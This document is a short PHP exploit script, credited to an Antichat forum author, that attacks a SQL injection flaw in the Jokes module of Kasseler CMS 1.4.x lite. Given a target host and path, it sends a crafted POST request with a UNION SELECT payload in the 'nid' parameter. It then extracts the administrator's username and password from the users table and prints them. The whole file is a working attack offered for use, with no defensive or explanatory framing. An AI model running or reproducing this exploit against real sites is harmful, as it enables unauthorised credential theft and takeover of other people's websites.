<?php
echo "\n\n#############################################################################\n";
echo "##                                                                         ##\n";
echo "##   Product: Kasseler CMS 1.4.x lite (Module Jokes) SQL-Injection Exploit ##\n";
echo "##   Usage: php.exe kasseler.php www.site.com /cmspath/                    ##\n";
echo "##   Require: Magic_quotes = off                                           ##\n";
echo "##   Author: Sc0rpi0n [RUS] (http://scorpion.su)                           ##\n";
echo "##   Special for Antichat (http://forum.antichat.ru)                       ##\n";
echo "##                                                                         ##\n";
echo "#############################################################################\n\n";
$host=$argv[1];
$path=$argv[2];

$fsock=fsockopen($host,80);
$headers="POST http://".$host.$path."index.php?module=Jokes&do=ajaxcancel HTTP/1.0\r\n";
$headers.="Host: $host\r\n";
$headers.="UserAgent: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7\r\n";
$headers.="Accept: text/html, application/xml;q=0.9, application/xhtml+xml, */*;q=0.1\r\n";
$headers.="Connection: Keep-Alive\r\n";
$headers.="Content-Type: application/x-www-form-urlencoded\r\n";
$headers.="Content-length: 116\r\n\r\n";
$headers.="&nid=-1'+UNION SELECT concat(0x3a3a,user_name,0x3a3a3a,user_password,0x3a3a3a3a) FROM kasseler_users WHERE uid=1 -- ";
fwrite($fsock,$headers);
while(!feof($fsock))
	$response.=fread($fsock,1024);
$pos1=strpos($response,"::") or die("## http://$host is not vulnerable or error\n");
$pos2=strpos($response,":::") or die("## http://$host is not vulnerable or error\n");
$pos3=strpos($response,"::::") or die("## http://$host is not vulnerable or error\n");
$len1=$pos2-$pos1;
$len2=$pos3-$pos2;

$login=substr($response,$pos1+2,$len1-2);
$password=substr($response,$pos2+3,$len2-3);

echo "## Host: $argv[1]\n";
echo "## Login: $login\n";
echo "## Password: $password\n";
?>